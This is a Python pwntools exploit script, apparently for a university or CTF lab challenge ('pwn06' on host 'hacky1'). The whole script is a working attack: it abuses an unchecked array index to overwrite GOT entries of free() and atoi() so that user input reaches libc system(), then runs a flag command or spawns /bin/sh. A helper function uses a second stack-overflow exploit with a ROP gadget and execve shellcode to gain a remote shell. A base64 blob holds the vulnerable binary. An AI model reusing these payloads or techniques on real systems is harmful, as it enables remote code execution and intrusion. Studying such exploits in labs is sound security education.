#!/usr/bin/python3

import pwn
import sys
import ctypes
import base64

#assign host and port to connect to
#port_ar is the pwn02 port used to obtain addresses (if enabled)
#via DEFAULTS
host = "hacky1"
port = 13706
port_ar = 13702
#via COMMANDLINE ARGUMENTS
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])
if len(sys.argv) >= 4:
    port_ar = int(sys.argv[3])


#NOTE: CONFIG VARIABLES HERE:
#If set to True, the heap address will be obtained by using pwn02
#Otherwise the prepared hardcoded value will be used
#IMPORTANT: Leave this on False for arbiter to work properly!
obtain_addr_enabled = False
#If set to true additional print statements beyond just printing the flag will trigger
verbose_output_enabled = True
#If set to True, the exploit will spawn a shell in interactive mode in addition to printing a flag
interactive_shell = False
#If set to true, binary will be read from 'vuln.tar.xz' file in same folder as this script
#Else use prepared compressed and base64 encoded binary at the bottom
read_vuln_binary_file = False


if verbose_output_enabled != True:
    pwn.context.log_level = 'error'


def exploit():

    #The following addresses (main, global offset table) and offsets (relative to libc base) 
    #can be obtained from the vuln and libc binaries directly and hardcoded here
    addr_got_free = 0x403470       #Global offset table entry of free()
    addr_got_atoi = 0x4034c0       #Global offset table entry of atoi()
    loopback_addr_main = 0x401108  #Address within main we want to jump back to
    offset_libc_system = 0x45e50   #Offset of the system() function within the libc binary

    #What can be exploited here?
    #Although the allocation in line 33 of vuln.c uses the variable num to specify its size, which 
    #  is restricted to a maximum of 255 due to the bitwise and with 0xFF in line 31, the array 
    #  index used specify the memory location to modify in line 46 is not num but i, which stores 
    #  the unmodified output of atoi applied to the user input. Hence a very big (or negative) number 
    #  could be entered by the user to modify a memory location far beyond the allocated memory.
    #If we know the exact memory location of array on the heap, we can choose this index in order 
    #  to overwrite a specific memory location containing some interesting target.
    #Since ASLR is disabled, figuring out the location of the heap is not overly hard. It is 
    #  sufficient to figure each location on the heap we write something relative to out once and 
    #  hardcode it for future executions, as will be the same across executions of the program 
    #  given the same set of inputs. The same is true for the base address of libc. For a method 
    #  to automatically retrieve the required addresses from hacky1 using an old exploit see 
    #  get_hacky1_shell(...), get_heap_array_addr(...), and get_libc_base_addr(...) below.

    #Obtain heap and libc addresses automatically using pwn02, if enabled
    if obtain_addr_enabled == True:
        input_list = [b"dummy1", b"dummy2"]
        addr_heap_array = get_heap_array_addr(host, port_ar, input_list)
        array_index_got_free = ctypes.c_uint64(addr_got_free - addr_heap_array[0]).value // 4
        input_list = [str(array_index_got_free).encode(), str(loopback_addr_main).encode(), b"dummy1", b"dummy2"]
        addr_heap_array = get_heap_array_addr(host, port_ar, input_list)
        array_index_got_atoi = ctypes.c_uint64(addr_got_atoi - addr_heap_array[1]).value // 4
        addr_libc_base = get_libc_base_addr(host, port_ar)
    #Hardcode the heap and libc addresses, else
    else:
        addr_heap_array = [0x4042d0, 0x404660]
        array_index_got_free = ctypes.c_uint64(addr_got_free - addr_heap_array[0]).value // 4
        array_index_got_atoi = ctypes.c_uint64(addr_got_atoi - addr_heap_array[1]).value // 4
        addr_libc_base = 0x7ffff7dee000
    addr_libc_system = addr_libc_base + offset_libc_system

    #Connect to pwn06 on remote server
    print_verbose_stuff("establish pwn06 connection", [host, str(port)])
    proc=pwn.remote(host, port, fam="ipv4")                                                                                                                                       


    #First establish loop:
    #Although we are very flexible in choosing the exact memory location we want to overwrite, we 
    #  can only write 4 byes to the specified address. So if we target a memory address a partial 
    #  override will have to do.
    #Also specifying both the function we want to invoke (such as system) as well as the address 
    #  of its argument (such as the string /bin/sh) with an override of only four bytes is tough, 
    #  so we may need to establish some kind of loop to triger the arbitrary write multiple times.
    #Notably the global offset table and the heap are not to far apart in memory, the GOT being 
    #  located at a lower memory address that is hardcoded in the binary (no PIE). Using a 
    #  negative array index we should be able to reach it and partially override one of the 
    #  addresses within.
    #A second thing to note is, that free() has never been called by the program up to this point. 
    #  This means that, since RELRO is disabled, the GOT will not only be writable but also not 
    #  yet contain the actual libc address of free(), but a reference to linker code responsible 
    #  for lazily resolving the address at runtime once it's needed. This linker code is also 
    #  located within our binary and will hence have a very low address (upper half 0x00000000).
    #Hence we can easily override the address currently contained in free()'s slot of the GOT 
    #  with an arbitrary address from the .text section in order to establish a loopback to that 
    #  address whenever free is called.
    #And that is exactly what we do:
    #  We first calculate the index needed to hit the targetet address within .got.plt by 
    #    subtraction the address of array on the heap from the target address, which yields a 
    #    negative result, and dividing its unsigned interpretation by 4 to compensate for the 
    #    size of the int data type of the array.
    #  After sending the resulting number in its decimal notation to the program we are prompted 
    #    to enter the number we want to write to memory, which will simply be the decimal notation 
    #    of an addres of an instruction within main immediately before the program's first prompt.
    print_verbose_stuff("inject loopback", [hex(loopback_addr_main), hex(addr_heap_array[0]), hex(array_index_got_free)])
    proc.write(str(array_index_got_free).encode() + b"\n")
    proc.write(str(loopback_addr_main).encode() + b"\n")

    #Next inject a call to libc's system():
    #We've now established a situation, in which the program will always loop back to ist first 
    #  prompt for user input once it reaches the free(buf) call in line 55 of main().
    #Notably we jump to a location within main AFTER the allocation of buf, but BEFORE the 
    #  allocation of array. So while buf will always remain at the same place in memory, array 
    #  will be newly allocated on the heap in each iteration, without the previous one being freed.
    #  Hence we need to adjust our index accordingly each iteration, since the memory address of 
    #  the array that serves as our anchorpoint in memory will be slightly higher each time.
    #Keeping this in mind we can now repeat the same procedure all over again and override another 
    #  got entry - this time that of atoi().
    #There are two reasons for this choice:
    #  - Firstly atoi() has been called before and will hence have its address resolved already 
    #    saving us a full iteration since we can simply keep the upper half of the address the 
    #    same when targeting some other libc address.
    #  - Secondly, and more importantly, atoi is called on buf multiple times. So we have full 
    #    control over the contents of its (first) argument, allowing us to invoke system() on an 
    #    arbitrary string of size BUFSIZE (0x20) or smaller.
    #Hence we simply use the (deterministic) address of the newly allocated buffer on the heap in 
    #  combination with the address of atoi()'s GOT entry to calculate the required array index, 
    #  then use the (static) base address of libc in combination with the offset of system within 
    #  libc to calculate the actual address of system() within memory. Then the decimal notation 
    #  of both values are sent to the program. It actually does not matter wether we use the full 
    #  libc address or only its four lower bytes here, since atoi will simply truncate the result 
    #  and discard the overflow during conversion.
    print_verbose_stuff("inject call libc-system", [hex(addr_libc_system), hex(addr_heap_array[1]), hex(array_index_got_atoi)])
    proc.write(str(array_index_got_atoi).encode() + b"\n")
    proc.write(str(addr_libc_system).encode() + b"\n")

    #We've now set up our program in a way so that system() is called on any input we provide to 
    #  the program from now on, allowing us to execute arbitrary commands on the server. 
    #Hence all that is left to do is send a command string invoking /bin/get_flag once we're 
    #  prompted for user input again and we're done. Yay!
    if interactive_shell != True:
        command_str = b"/bin/get_flag\n"
    else:
        command_str = b"/bin/get_flag && /bin/sh\n"
    print_verbose_stuff("inject command str", [command_str.decode()])
    proc.write(command_str)

    #Read that flag and pint it...
    proc.readuntil(b"flag_")
    print("Here's your flag:")
    print(" >\033[31;1m flag_" + proc.readline().decode() + "\033[0m")

    if interactive_shell == True:
        print("Here's your interactive shell:")
        proc.interactive()

    proc.close()
    return 0


#BEYOND HERE IS SUPPLEMENTARY CODE FOR ADDRES RETRIEVAL AND OUTPUT
#THE HARDCODED EXPLOIT VARIANT WORKS WITHOUT THIS CODE


def get_hacky1_shell(host_ar, port_ar):
    if verbose_output_enabled == True:
        print("Setting up hacky1 shell using pwn02 via \033[1m" + host_ar + ":" + str(port_ar) + "\033[0m.")
    #Slightly modified code from pwn02
    proc_ar = pwn.remote(host_ar, port_ar, fam="ipv4")
    proc_ar.write(40*b"\xFF")
    proc_ar.readline()
    stack_offset_buf = 0x38
    glibc_offset_funlockfile = 0x0000000000055090
    glibc_offset_ropgadget =   0x0000000000037fc9
    fn_call_puts = b"\xb9\x12\x40\x00\x00\x00\x00\x00"
    proc_ar.write(stack_offset_buf*b"\x00" + fn_call_puts + b"\n")
    glibc_addr_funlockfile = int.from_bytes(proc_ar.readline('\n')[16:22], byteorder='little')
    glibc_addr_ropgadget = glibc_addr_funlockfile - glibc_offset_funlockfile + glibc_offset_ropgadget
    shellcode = b"\x48\x31\xD2\x48\x31\xF6\x54\x5F\x48\x83\xC7\x15\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
    sh_binary = b"/bin/sh\x00"
    exploit = 0x38*b"\x00" + glibc_addr_ropgadget.to_bytes(8, 'little') + shellcode + sh_binary + b"\n"
    proc_ar.write(exploit)
    return proc_ar


#Use gdb to replicate looped state and print heap addresses of array after specific input sequence
def get_heap_array_addr(host_ar, port_ar, input_list):
    proc_ar = get_hacky1_shell(host_ar, port_ar)

    vuln_binary_compressed_b64 = get_vuln_binary_compressed_b64()

    if verbose_output_enabled == True:
        print("Initiating gdb on hacky1 to obtain addresses.")

    command_str  = b"cd /tmp/"
    command_str += b" && mkdir pwn06"
    command_str += b" && cd pwn06"
    command_str += b" && echo " + vuln_binary_compressed_b64 +b" > vuln_b64"
    command_str += b" && base64 -d vuln_b64 > vuln.tar.xz"
    command_str += b" && tar -xvf vuln.tar.xz"
    command_str += b" && rm vuln_b64 vuln.tar.xz"
    command_str += b" && chmod +x vuln"
    #Starts gdb; sets breakpoint after calloc; sets loopback via got entry of free();
    command_str += b" && gdb vuln -ex \"b *0x401149\" -ex \"set confirm off\" -ex \"set logging enabled off\" -ex \"set history save off\" -ex \"r\" -ex \"set *0x403470=0x401108\" "
    command_str += b"\n"
    proc_ar.write(command_str)

    array_addr_list = []

    if len(input_list) < 2:
        input_list = [b"dummy1", b"dummy2"]

    for i in range (0,len(input_list)//2):
        if verbose_output_enabled == True:
            print("\033[1mIteration #" + str(i) + ":\033[0m")
            print("Using inputs \"" + input_list[2*i].decode() + "\", \"" + input_list[(2*i)+1].decode() + "\"")
        array_addr_list.append(0)

        proc_ar.readuntil(b"How many random numbers are there? [0,255]: ")

        #proc_ar.write(b"4611686018427386984\n") #some input
        proc_ar.write(input_list[1*i] + b"\n")
        proc_ar.readuntil(b"in main ()\n(gdb) ")

        proc_ar.write(b"x/xg $rax\n") #get address of array on heap

        #get addresses
        tmp_str = proc_ar.readuntil(b":\t")
        array_addr_list[i] = int(tmp_str[0:len(tmp_str)-2].decode(), 16)
        proc_ar.readuntil(b"(gdb) ")

        if verbose_output_enabled == True:
            print("Address of array on heap:  \033[5;1;32m" + hex(array_addr_list[i]) + "\033[0m")

        proc_ar.write(b"c\n")
        proc_ar.readuntil(b"manipulate: ")
        proc_ar.write(input_list[(2*i)+1] + b"\n")

    #Clean up mess
    if verbose_output_enabled == True:
        print("Removing temporary files from hacky1.")
    proc_ar.write(b"kill\n")
    proc_ar.write(b"q\n")
    proc_ar.readuntil(b"(gdb) ")
    proc_ar.write(b"cd ..\n")
    proc_ar.write(b"rm -r pwn06\n")

    #exit shell
    proc_ar.write(b"exit\n")
    proc_ar.close()
    if verbose_output_enabled == True:
        print("Done obtaining addresses from hacky1.\n")

    return array_addr_list


def get_libc_base_addr(host_ar, port_ar):
    proc_ar = get_hacky1_shell(host_ar, port_ar)
    proc_ar.clean()
    proc_ar.write(b"cat /proc/$$/maps | grep libc | grep 00000000\n")
    libc_addr_str = proc_ar.readline()[0:12]
    libc_addr = int(libc_addr_str.decode(), 16)
    if verbose_output_enabled == True: print("Retrieved libc base address: \033[5;1;32m" + hex(libc_addr) + "\033[0m")
    proc_ar.close()
    if verbose_output_enabled == True: print("Done obtaining addresses from hacky1.\n")
    return libc_addr


#Just print statements that have been moved down here in order to not clutter up the exploit() function
def print_verbose_stuff(argid, arglist):
    if verbose_output_enabled != True:
        return
    l = len(arglist)-1
    tmp_output_str = {
        "establish pwn06 connection":
            "Establishing connection to hacky1 on \033[1m" +
            arglist[min(0,l)] +
            ":" + 
            arglist[min(1,l)] +
            "\033[0m to perform exploit on pwn06."
        ,
        "inject loopback":
            "Injecting loopback to \033[1;34m" +
            arglist[min(0,l)] +
            "\033[0m in main via (partial) got entry override of free() located at array (" +
            arglist[min(1,l)] +
            ") index \033[1;34m" +
            arglist[min(2,l)] +
            "\033[0m."
        ,
        "inject call libc-system":
            "Injecting call to libc function system() at \033[1;34m" +
            arglist[min(0,l)] +
            "\033[0m via (partial) got entry override of atoi() at array (" + 
            arglist[min(1,l)] +
            ") index \033[1;34m" +
            arglist[min(2,l)] +
            "\033[0m."
        ,
        "inject command str":
            "Injecting command string: \033[1;34m" +
            arglist[min(0,l)] +
            "\033[0m"
        ,
    }
    print(tmp_output_str.get(argid))


def get_vuln_binary_compressed_b64():
    if read_vuln_binary_file == True:
        #encode pwn06 vuln
        binary_file=open("vuln.tar.xz","rb")
        vuln_binary_compressed_b64 = base64.b64encode(binary_file.read())
        binary_file.close()
    #Added so that no other files are needed to run address retrieval
    else:
        vuln_binary_compressed_b64 = b"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"
    return vuln_binary_compressed_b64


exploit()


